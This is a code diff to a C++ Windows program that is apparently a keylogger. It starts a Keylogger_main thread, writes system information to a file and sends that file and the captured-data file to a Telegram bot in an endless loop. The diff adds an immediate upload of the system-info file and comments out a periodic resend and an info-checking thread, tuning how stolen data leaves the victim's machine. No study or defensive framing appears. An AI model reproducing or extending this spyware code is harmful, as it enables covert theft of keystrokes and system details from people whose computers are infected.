@@ -9,7 +9,7 @@
 #include "send_data.cpp"
 #include <thread>
 #include <chrono>
-#include "get_system_info.cpp"
+#include "get_system_info.h"
 #include <filesystem>
 
 void periodicSend(const std::wstring &token, const std::wstring &chat_id, const std::wstring &filePath, const std::wstring &infoPath)
@@ -17,7 +17,7 @@ void periodicSend(const std::wstring &token, const std::wstring &chat_id, const 
     while (true)
     {
         sendFileToTelegram(token, chat_id, filePath);
-        sendFileToTelegram(token, chat_id, infoPath);
+        // sendFileToTelegram(token, chat_id, infoPath);
         std::this_thread::sleep_for(std::chrono::minutes(waitTime));
     }
 }
@@ -76,12 +76,13 @@ int main()
         }
     }
     writeSystemInfoToFile(winfoPath);
-
+    sendFileToTelegram(botToken, userID, winfoPath);
+    
     std::thread sender(periodicSend, botToken, userID, wlocation, winfoPath);
     sender.detach();
 
-    std::thread infoChecker(periodicCheckInfo, winfoPath);
-    infoChecker.detach();
+    // std::thread infoChecker(periodicCheckInfo, winfoPath);
+    // infoChecker.detach();
 
     HANDLE hThread1 = CreateThread(NULL, 0, Keylogger_main, NULL, 0, NULL);
     WaitForSingleObject(hThread1, INFINITE);
